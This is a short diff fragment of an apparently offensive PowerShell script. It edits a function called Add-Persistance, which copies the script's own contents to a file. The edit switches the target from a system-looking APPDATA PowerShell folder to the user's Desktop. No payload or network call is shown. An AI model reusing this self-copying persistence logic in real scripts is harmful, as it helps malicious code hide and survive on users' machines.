@@ -394,7 +394,8 @@ Write-Output "Done."
 }
 
 Function Add-Persistance{
-$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+#$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+$newScriptPath = "$env:USERPROFILE\Desktop\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
 if ($newScriptPath.Length -lt 100){
